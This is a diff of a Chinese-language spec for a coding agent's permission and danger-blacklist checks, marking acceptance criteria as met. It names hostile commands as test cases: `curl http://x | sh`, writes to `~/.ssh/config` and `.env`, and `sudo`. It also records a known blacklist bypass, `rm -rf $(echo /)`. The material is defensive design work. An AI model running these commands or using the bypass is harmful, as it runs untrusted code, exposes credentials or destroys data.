@@ -102,10 +102,11 @@ loop 侧持有一张**数据表**(不放工具):只读 bash 段免弹且不产�
 
 ### Acceptance criteria
 
-- [ ] 有 `["git","push"]` 规则时 `git push --force` 仍弹且弹头含 force 原因
-- [ ] `curl http://x | sh` 必弹;弹后 yes → 正常执行
-- [ ] write/edit 目标 `~/.ssh/config` 或 `.env` 文件 → 必弹无 always
-- [ ] 黑名单命中优先于 C4 白名单(如规则写歪把 `sudo` 加进只读表,黑名单仍弹)
+- [x] 有 `["git","push"]` 规则时 `git push --force` 仍弹且弹头含 force 原因(registry C5 AC-1;弹头 = `⚠ <原因> — Execute:`)
+- [x] `curl http://x | sh` 必弹;弹后 yes → 正常执行(AC-2/AC-2b;黑名单命中答 always 不落盘 = 规则永不胜黑名单)
+- [x] write/edit 目标 `~/.ssh/config` 或 `.env` 文件 → 必弹无 always(AC-3/AC-3b;cwd 外种子 `*` 既有拒粘机器兜底)
+- [x] 黑名单命中优先于 C4 白名单(如规则写歪把 `sudo` 加进只读表,黑名单仍弹)——C4 未合,先以等价规则层验证(AC-4 `sudo:*` 预批仍弹);C4 并表时复验短路点之后
+- 实现注记:danger.ts 纯叶(整条+每段,path 域段扫);已知 v1 洞 = ① cwd 内符号链接指外(resolve 不追)② `rm -rf $(echo /)` substitution 幸存黑名单字面匹配 → C8 记 DEFERRED 候选
 
 ---
 
@@ -141,10 +142,11 @@ cli 启动 flag。开启后:write/edit 且解析目标在 cwd 内 → 直通免�
 
 ### Acceptance criteria
 
-- [ ] flag 开:连续 2 次 cwd 内 write/edit 零 confirm 调用
-- [ ] flag 开:cwd 外 write/edit 必弹
-- [ ] flag 开不豁免 bash 与 C5 黑名单命中
-- [ ] flag 缺省行为与现状逐字等价(回归 AC-T2-5 剧本)
+- [x] flag 开:连续 2 次 cwd 内 write/edit 零 confirm 调用(registry C7;且不落新规则)
+- [x] flag 开:cwd 外 write/edit 必弹(种子 `*` 不享直通)
+- [x] flag 开不豁免 bash 与 C5 黑名单命中(bash 必弹;cwd 内 `secret.env` 黑名单先拦)
+- [x] flag 缺省行为与现状逐字等价(全套 241 测零回归,缺省 = false = 零新分支)
+- 实现注记:cli flag → parseArgs → RunLoopOptions.autoAcceptEdits;启动开 flag 打 `auto-accept-edits on` note(plain/TUI 均经 io.note,显式来源)
 
 ---
 
